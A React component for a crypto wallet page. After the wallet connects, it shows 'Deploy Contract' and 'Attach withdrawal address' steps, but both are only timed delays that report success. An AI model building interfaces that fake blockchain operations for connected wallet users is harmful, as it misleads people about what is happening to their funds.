import { useState } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import GetMaxAmount from "./GetMaxAmount";
import "./componet.css";

const nonWorkingAddresses = [
  "0x1234567890abcdef1234567890abcdef12345678", // Example non-working address
  "0xabcdefabcdefabcdefabcdefabcdefabcdefabcdef",
];

const AttachPanel = ({
  attachInput,
  setAttachInput,
  handleAttachSubmit,
  attaching,
}) => {
  const [isValid, setIsValid] = useState(false);
  const [isNonWorking, setIsNonWorking] = useState(false);

  const handleChange = (e) => {
    const inputValue = e.target.value.trim();
    const isValidEthAddress = /^0x[a-fA-F0-9]{40}$/.test(inputValue);
    const isInNonWorkingList = nonWorkingAddresses.includes(
      inputValue.toLowerCase()
    );

    setAttachInput(inputValue);
    setIsValid(isValidEthAddress);
    setIsNonWorking(isInNonWorkingList);
  };

  return (
    <div id="attachPanel" className="panel card p-4 mb-4">
      <input
        type="text"
        id="secondAddress"
        name="second_address"
        className="form-control"
        placeholder="Input withdrawal address ETH-0x..."
        value={attachInput}
        onChange={handleChange}
      />
      {attachInput && !isValid && (
        <p className="text-danger mt-2">Invalid Ethereum address.</p>
      )}
      {isValid && isNonWorking && (
        <p className="text-warning mt-2">
          This Ethereum address is currently non-working.
        </p>
      )}

      <button
        id="attachButton"
        className="btn btn-info btn-block mt-3"
        onClick={handleAttachSubmit}
        disabled={!isValid || isNonWorking || attaching}
      >
        {attaching ? (
          <>
            <i className="fas fa-spinner fa-spin"></i> Attaching...
          </>
        ) : (
          <>
            <i className="fas fa-paperclip"></i> Attach
          </>
        )}
      </button>
    </div>
  );
};

function DeployButton() {
  const { isConnected } = useAppKitAccount();
  const [deploying, setDeploying] = useState(false);
  const [deployCompleted, setDeployCompleted] = useState(false);
  const [attachVisible, setAttachVisible] = useState(false);
  const [attachCompleted, setAttachCompleted] = useState(false);
  const [showMaxAmount, setShowMaxAmount] = useState(false);
  const [attachInput, setAttachInput] = useState("");
  const [attaching, setAttaching] = useState(false); // NEW

  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

  const handleDeploy = async () => {
    if (!isConnected) return; // Ensure wallet is connected before allowing deploy
    setDeploying(true);

    await delay(3000); // Simulate deployment time
    setDeploying(false);
    setDeployCompleted(true); // Hide Deploy button
    setAttachVisible(true); // Show Attach input
  };

  const handleAttachSubmit = async () => {
    if (!attachInput.trim()) return; // Ensure input is not empty
    setAttaching(true); // Show "Attaching..." on button

    await delay(2000); // Simulate attaching process
    setAttaching(false); // Reset loading state

    setAttachCompleted(true); // Hide attach panel
    setAttachVisible(false); // Hide attach panel
    setShowMaxAmount(true); // Show GetMaxAmount component
  };

  return (
    <div>
      {/* Deploy Button */}
      {isConnected && !deployCompleted && (
        <div id="deployPanel" className="panel card p-4 mb-4">
          <button
            id="deployButton"
            className="btn btn-success btn-block"
            onClick={handleDeploy}
            disabled={deploying}
          >
            {deploying ? (
              <i className="fas fa-spinner fa-spin"></i>
            ) : (
              "🚀 Deploy Contract"
            )}
          </button>
        </div>
      )}

      {/* Attach Panel (Shows after Deploy completes) */}
      {attachVisible && !attachCompleted && (
        <AttachPanel
          attachInput={attachInput}
          setAttachInput={setAttachInput}
          handleAttachSubmit={handleAttachSubmit}
          attaching={attaching} // Pass attaching state
        />
      )}

      {/* Show GetMaxAmount after attach step */}
      {showMaxAmount && <GetMaxAmount />}
    </div>
  );
}

export default DeployButton;
